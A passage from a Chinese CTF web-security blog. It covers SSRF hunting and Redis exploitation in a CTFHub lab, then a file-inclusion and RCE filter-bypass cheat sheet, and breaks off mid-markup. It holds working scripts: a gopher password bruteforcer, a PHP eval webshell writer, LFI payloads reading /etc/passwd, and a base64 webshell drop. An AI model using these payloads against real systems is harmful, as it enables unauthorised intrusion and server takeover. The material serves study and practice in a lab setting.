title="六、SSRF漏洞点挖掘"></a>六、SSRF漏洞点挖掘</h2><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol><p>关键字：Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</p><h2 id="七、漏洞利用复现"><a href="#七、漏洞利用复现" class="headerlink" title="七、漏洞利用复现"></a>七、漏洞利用复现</h2><h3 id="ssrf打redis"><a href="#ssrf打redis" class="headerlink" title="ssrf打redis"></a>ssrf打redis</h3><p>主要方法：</p><ol><li>爆破密码</li><li>写shell</li><li>写入ssh公钥</li><li>定时任务反弹shell</li><li>主从复制</li></ol><p>参考<a href="https://www.cnblogs.com/wjrblogs/p/14456190.html">https://www.cnblogs.com/wjrblogs/p/14456190.html</a></p><p>环境：CTFHUB-SSRF-Redis协议</p><p>漏洞点：<code>/?url=</code></p><p><img src="/../img/SSRF_img/clip_image002.gif" alt="img"></p><p>xxxxxxxxxx npiet.exe -tpic download.png Python</p><p><img src="/../img/SSRF_img/clip_image004.gif" alt="img"></p><p>尝试用gopher爆破密码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>target = <span class="hljs-string">&quot;http://challenge-f6443f96c8918df3.sandbox.ctfhub.com:10800/?url=&quot;</span>  <span class="hljs-comment">#目标url</span><br>rhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span>   <br>rport = <span class="hljs-string">&quot;6379&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwd.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    passwds = file.readlines()<br>    <span class="hljs-keyword">for</span> passwd <span class="hljs-keyword">in</span> passwds:<br>        passwd = passwd.strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>        len_pass = <span class="hljs-built_in">len</span>(passwd)<br>        payload = <span class="hljs-string">r&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span> + rport + <span class="hljs-string">&quot;/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524&quot;</span>+<span class="hljs-built_in">str</span>(len_pass)+<span class="hljs-string">r&quot;%250d%250a&quot;</span>+passwd+<span class="hljs-string">r&quot;%250D%250A%252A1%250D%250A&quot;</span><br>        url = target+<span class="hljs-built_in">str</span>(payload)<br>        text = requests.get(url).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 爆破成功 密码为: &quot;</span> + passwd)<br>            <span class="hljs-built_in">print</span>(text + payload)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>无果，写shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># 使用的协议 </span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span>   <span class="hljs-comment"># 目标redis的端口号 </span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php @eval($_POST[&#x27;xxx&#x27;]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span>   <span class="hljs-comment"># shell的名字 </span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span>      <span class="hljs-comment"># 写入的路径</span><br>passwd=<span class="hljs-string">&quot;&quot;</span>   <span class="hljs-comment"># 如果有密码 则填入</span><br><span class="hljs-comment"># 恶意命令 </span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += parse.quote(redis_format(x))<br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;二次url编码后的结果:\n&quot;</span> ,parse.quote(payload))<br><br></code></pre></td></tr></table></figure><p>生成gopher写shell的payload</p><p><img src="/../img/SSRF_img/clip_image006.gif" alt="img"></p><p>写马，执行，成功</p><p><img src="/../img/SSRF_img/clip_image008.gif" alt="img"></p><p>无法写入ssh公钥，原因：redis是www-data权限，写不进&#x2F;root</p><p>无法写入定时计划反弹shell，原因：没有crontab命令</p><h3 id="ssrf打mysql"><a href="#ssrf打mysql" class="headerlink" title="ssrf打mysql"></a>ssrf打mysql</h3><p>参考</p><p><a href="https://www.sqlsec.com/2021/12/bytectf2021.html">https://www.sqlsec.com/2021/12/bytectf2021.html</a></p><p><a href="https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/">https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/</a></p><p>ssrf dict探测到有3306。利用<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>生成payload探测mysql有无密码</p><p>注意Gopherus无法直接生成udf的payload（会截断），需要改一下代码</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含与RCE</title>
    <link href="/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/"/>
    <url>/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含与RCE"><a href="#文件包含与RCE" class="headerlink" title="文件包含与RCE"></a>文件包含与RCE</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="文件包含常见函数"><a href="#文件包含常见函数" class="headerlink" title="文件包含常见函数"></a>文件包含常见函数</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">PHP：<span class="hljs-built_in">include</span>()，<span class="hljs-built_in">include_once</span>()，<span class="hljs-built_in">require</span>()，<span class="hljs-built_in">require_once</span>()，<span class="hljs-built_in">fopen</span>()，<span class="hljs-built_in">readfile</span>() 等<br>JSP Servlet：ava<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.File</span>()，java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileReader</span>() 等<br>ASP：includefile，includevirtual 等<br></code></pre></td></tr></table></figure><p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件是什么类型。</p><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><h4 id="1-00-截断"><a href="#1-00-截断" class="headerlink" title="[1]%00 截断"></a>[1]%00 截断</h4><p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。 <code>?file=../../../../../../../../../etc/passwd%00</code></p><h4 id="2-路径长度截断"><a href="#2-路径长度截断" class="headerlink" title="[2]路径长度截断"></a>[2]路径长度截断</h4><p>Linux 需要文件名长于 4096，Windows 需要长于 256。 <code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></p><h4 id="3-点号截断"><a href="#3-点号截断" class="headerlink" title="[3]点号截断"></a>[3]点号截断</h4><p>只适用 Windows，点号需要长于 256。 <code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>条件<br><code>allow_url_include = on</code></p><p>实质上和LFI一样，只是能够包含远程的文件</p><p>用得比较多的协议有<code>php://input</code></p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p><p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流，可以接收post请求作为输入流的输入，将请求作为PHP代码输入，以达到以post的形式进行输入的目的就可以执行命令命令<br>遇到<code>file_get_contents()</code>要联想到<code>php://input</code>绕过</p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file1</span>);        <span class="hljs-comment">#文件读取</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file2</span>,<span class="hljs-variable">$txt</span>);   <span class="hljs-comment">#文件写入</span><br><span class="hljs-meta">?&gt;</span><br><br>payload:<br><br>?file1=php:<span class="hljs-comment">//filter/resource=flag.php                             #明文读取</span><br>?file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php  #编码读取</span><br> <br>?file2=php:<span class="hljs-comment">//filter/resource=test.txt&amp;txt=test                             #明文写入</span><br>?file2=php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=test.txt&amp;txt=test #编码写入</span><br></code></pre></td></tr></table></figure><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code> </p><p>常见编码有两种方式：<code>base64</code>&#x2F;rot-13编码，两种过滤器分别为： <code>base64：convert.base64-encode</code> <code>rot-13：string.rot13</code><br>扩展（绕过方式）：<br><a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a><br><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p><h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=On</code> </p><p>类似php:&#x2F;&#x2F;input，用户控制输入流<br><code>data://text/plain;base64,Y2F0IC9mbGFn</code><br><code>data:text/plain;base64,Y2F0IC9mbGFn</code></p><h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p><p>zip:&#x2F;&#x2F;可以访问压缩包里面的文件，当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行，从而实现任意代码执⾏。只需要是zip的压缩即可，后缀名可以任意更改<br><code>zip:///tmp/file.zip%23flag.txt</code></p><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><p>利用条件：<br> <code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p><p>php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压，与zip协议有些相似</p><h4 id="netdoc"><a href="#netdoc" class="headerlink" title="netdoc:&#x2F;&#x2F;"></a>netdoc:&#x2F;&#x2F;</h4><p>在java中可以利用netdoc协议读取文件，可以简单认为部分代替了file协议，多用于ssrf</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE英文全称：remote command&#x2F;code execute（远程命令&#x2F;代码执行漏洞） 漏洞出现的原因：没有在输入口做输入处理。 我们常见的路由器、防火墙、入侵检测等设备的web管理界面上可能会提供给用户一个命令操作的web界面&#x2F;接口，如果此接口未做过滤&#x2F;有漏洞，攻击者有可能直接向服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p><h3 id="危险函数："><a href="#危险函数：" class="headerlink" title="危险函数："></a>危险函数：</h3><p>php：<code>eval()</code>、<code>assert()</code>、<code>create_function()</code>、<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>exec()</code><br>asp：<code>eval()</code><br>perl：<code>exec</code>、<code>system</code>、<code>qx//</code><br>python：<code>os.system()</code><br>go：<code>exec.Command()</code></p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Bash">more:        一页一页的显示档案内容<br>less:        与 more 类似 <span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:        从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是<span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:        查看尾几行<br><span class="hljs-built_in">nl</span>:                显示内容，顺便输出行号<br><span class="hljs-built_in">od</span>:                以二进制的方式读取档案内容<br>vi:                一种编辑器，这个也可以查看<br>vim:        一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:        文件排序并输出也可以查看内容<br><span class="hljs-built_in">uniq</span>:        可以查看 file -f:报错出具体内容 grep<br>strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 <span class="hljs-built_in">test</span> 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep <span class="hljs-built_in">test</span> *file strings<br><span class="hljs-built_in">paste</span>        把每个文件以列对列的方式，一列列地加以合并<br>grep        grep &#123; flag.php打印有”&#123;“的一行<br>sed                一种编辑器，可以用sed -f flag.php读取flag<br>rev          读取倒叙的文件内容<br></code></pre></td></tr></table></figure><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>使用<code>/**/</code>、<code>&lt;</code>、<code>&lt;&gt;</code>、<code>%20</code>、<code>%09</code>、<code>$IFS$9</code>、<code>$&#123;IFS&#125;</code>、<code>IFS</code>、<code>$IFS$1</code>等</p><h4 id="过滤分隔符"><a href="#过滤分隔符" class="headerlink" title="过滤分隔符 &#x2F;"></a>过滤分隔符 &#x2F;</h4><p>利用<code>;</code>执行多条命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cd</span> xx;<span class="hljs-built_in">ls</span> -al</span><br></code></pre></td></tr></table></figure><h4 id="过滤运算符-和"><a href="#过滤运算符-和" class="headerlink" title="过滤运算符|和&amp;"></a>过滤运算符|和&amp;</h4><p>使用<code>;</code>或 <code>%0a</code></p><h4 id="过滤flag、php等字符"><a href="#过滤flag、php等字符" class="headerlink" title="过滤flag、php等字符"></a>过滤flag、php等字符</h4><h5 id="拼接字符串绕过"><a href="#拼接字符串绕过" class="headerlink" title="拼接字符串绕过"></a>拼接字符串绕过</h5><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=m=p%0an=hp%0acat$&#123;IFS&#125;flag.$m$n<br></code></pre></td></tr></table></figure><h5 id="ls-i"><a href="#ls-i" class="headerlink" title="ls -i"></a>ls -i</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -i + <span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure><p>组合拳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">ls</span> -i   <span class="hljs-comment">#找出文件pid</span><br><span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`   <span class="hljs-comment">#find / -inum id返回此id对应的文件名（路径）</span><br></code></pre></td></tr></table></figure><h5 id="输出到另一个文件"><a href="#输出到另一个文件" class="headerlink" title="输出到另一个文件"></a>输出到另一个文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">printf</span> /fla &gt; /tmp/hello %26%26 <span class="hljs-built_in">printf</span> g &gt;&gt; /tmp/hello %26%26 <span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello`<br><span class="hljs-comment">#printf /fla &gt; /tmp/hello ----&gt; 将 /fla 写入/tmp/hello文件</span><br><span class="hljs-comment">#printf g &gt;&gt; /tmp/hello ----&gt; 将 g 追加写入/tmp/hello文件。目前/tmp/hello文件中的内容就是：/flag</span><br><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello` ----&gt; `<span class="hljs-built_in">cat</span> /tmp/hello` 会输入出 /flag，<span class="hljs-built_in">cat</span> 会读取 /flag ，即可得到flag。<br></code></pre></td></tr></table></figure><h5 id="编码绕过-写入文件"><a href="#编码绕过-写入文件" class="headerlink" title="编码绕过(写入文件)"></a>编码绕过(写入文件)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;</span> | <span class="hljs-built_in">base64</span> -d 1.php<br></code></pre></td></tr></table></figure><h5 id="单双引号绕过"><a href="#单双引号绕过" class="headerlink" title="单双引号绕过"></a>单双引号绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t fl<span class="hljs-string">&#x27;&#x27;</span>ag 或ca<span class="hljs-string">&quot;&quot;</span>t fl<span class="hljs-string">&quot;&quot;</span>ag<br></code></pre></td></tr></table></figure><h5 id="shell变量绕过"><a href="#shell变量绕过" class="headerlink" title="shell变量绕过"></a>shell变量绕过</h5><p> <code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></p><h5 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t f\lag<br></code></pre></td></tr></table></figure><h5 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f*<br><span class="hljs-built_in">cat</span> fla?<br></code></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="花括号"><a href="#花括号" class="headerlink" title="花括号{}"></a>花括号{}</h5><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 <code>&#123;cat,flag&#125;</code></p><h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><p>相当于cat目录下所有文件</p><h5 id="非法变量"><a href="#非法变量" class="headerlink" title="非法变量"></a>非法变量</h5><p><a href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a_b.&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$var</span>);<br></code></pre></td></tr></table></figure><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p><p>传参 <code>?a[b.=system(&quot;ls&quot;);</code></p><h5 id="一些组合拳payload"><a href="#一些组合拳payload" class="headerlink" title="一些组合拳payload"></a>一些组合拳payload</h5><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">tac&lt;/fla\g.php||<br>awk%<span class="hljs-number">09</span><span class="hljs-string">&#x27;/f/&#123;print&#125;&#x27;</span>%<span class="hljs-number">09</span>/fla?||<br>uniq<span class="hljs-string">$&#123;</span><span class="hljs-type">IFS</span>&#125;/f???<br>/???/????<span class="hljs-number">64</span> /????<br>uniq `expr substr <span class="hljs-string">$P</span>ATH <span class="hljs-number">11</span>`f*<br>od -c <span class="hljs-string">$&#123;</span><span class="hljs-type">OLDPWD</span>&#125;flag<br>cat <span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-number">0</span>:<span class="hljs-number">1</span>&#125;f*<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#LESS</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-type">SHLVL</span>&#125;&#125;   <span class="hljs-symbol">#ls</span><br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125; ?<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;??   #应该是这个：nl flag<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;?<span class="hljs-string">$&#123;</span><span class="hljs-type">USER</span>:~<span class="hljs-type">A</span>&#125;? ????   #/bin/cat flag<br>&lt;<span class="hljs-type">A</span>;<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;?????<span class="hljs-string">$&#123;</span><span class="hljs-type">RANDOM</span>::<span class="hljs-string">$?</span>&#125; ????      #/bin/base64 flag<br></code></pre></td></tr></table></figure><h3 id="无参数-无数字字母RCE"><a href="#无参数-无数字字母RCE" class="headerlink" title="无参数&#x2F;无数字字母RCE"></a>无参数&#x2F;无数字字母RCE</h3><p>参考<a href="https://xz.aliyun.com/t/8107#toc-0%E3%80%81https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/8107#toc-0、https://xz.aliyun.com/t/9360</a></p><p>过滤system <code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code></p><h4 id="1-一些常用函数"><a href="#1-一些常用函数" class="headerlink" title="(1)一些常用函数"></a>(1)一些常用函数</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span 